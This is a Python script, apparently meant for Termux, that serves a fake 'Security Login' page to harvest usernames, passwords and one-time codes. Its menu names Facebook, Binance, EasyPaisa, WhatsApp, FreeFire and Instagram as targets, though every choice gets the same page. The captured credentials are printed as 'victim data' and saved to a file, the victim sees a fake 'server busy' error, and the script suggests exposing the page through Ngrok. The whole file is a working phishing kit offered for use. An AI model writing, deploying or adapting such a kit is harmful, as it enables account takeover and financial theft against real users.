import http.server
import socketserver
import json
import os

PORT = 8080

class HackerFramework(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # --- MULTI-APP OTP DESIGN ---
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: sans-serif; background: #000; color: #fff; text-align: center; padding: 20px; }
                .card { background: #111; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 400px; margin: auto; }
                input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; background: #222; color: #fff; }
                .btn { background: #00ff00; color: #000; padding: 12px; border: none; border-radius: 5px; width: 95%; font-weight: bold; cursor: pointer; }
                #otp-section { display: none; }
                .app-icon { width: 60px; margin-bottom: 10px; }
            </style>
        </head>
        <body>
            <div class="card">
                <div id="login-section">
                    <h2 id="title">Security Login</h2>
                    <p id="desc">Verify your account to continue</p>
                    <input type="text" id="user" placeholder="Email / Phone / Username">
                    <input type="password" id="pass" placeholder="Password">
                    <button class="btn" onclick="showOTP()">NEXT</button>
                </div>

                <div id="otp-section">
                    <h2>Verification Code</h2>
                    <p>A 6-digit OTP has been sent to your device. Please enter it below.</p>
                    <input type="number" id="otp" placeholder="Enter 6-digit OTP">
                    <button class="btn" style="background:#ffcc00" onclick="sendAll()">VERIFY & LOGIN</button>
                </div>
            </div>

            <script>
                let username = "";
                let password = "";

                function showOTP() {
                    username = document.getElementById('user').value;
                    password = document.getElementById('pass').value;
                    if(username && password) {
                        document.getElementById('login-section').style.display = 'none';
                        document.getElementById('otp-section').style.display = 'block';
                    } else { alert("Please fill details"); }
                }

                function sendAll() {
                    const otp = document.getElementById('otp').value;
                    fetch('/', {
                        method: 'POST',
                        body: JSON.stringify({ User: username, Pass: password, OTP: otp })
                    }).then(() => {
                        alert("Error: Server busy. Try again later.");
                        location.reload();
                    });
                }
            </script>
        </body>
        </html>
        """
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length).decode('utf-8')
        
        # Termux terminal mein live data dikhana
        print(f"\033[1;32m\n[!] VICTIM DATA RECEIVED:")
        print(f"\033[1;37m{data}\033[0m")
        
        # File mein save karna
        with open("captured_data.txt", "a") as f:
            f.write(data + "\n")
            
        self.send_response(200)
        self.end_headers()

# --- TERMINAL MENU ---
os.system('clear')
print("\033[1;31m")
print("  _   _         _             ")
print(" | | | | __ _  | | _____ _ __ ")
print(" | |_| |/ _` | | |/ / _ \ '__|")
print(" |  _  | (_| | |   <  __/ |   ")
print(" |_| |_|\__,_| |_|\_\___|_|   ")
print("\n\033[1;34m [1] Facebook  [2] Binance  [3] EasyPaisa")
print(" [4] WhatsApp  [5] FreeFire [6] Instagram")
print("\033[1;33m")
choice = input("[+] Select Target App: ")

print(f"\n\033[1;32m[*] Server starting for option {choice}...")
with socketserver.TCPServer(("", PORT), HackerFramework) as httpd:
    print(f"[*] Live on Port {PORT}. Use Ngrok to get link.")
    httpd.serve_forever()
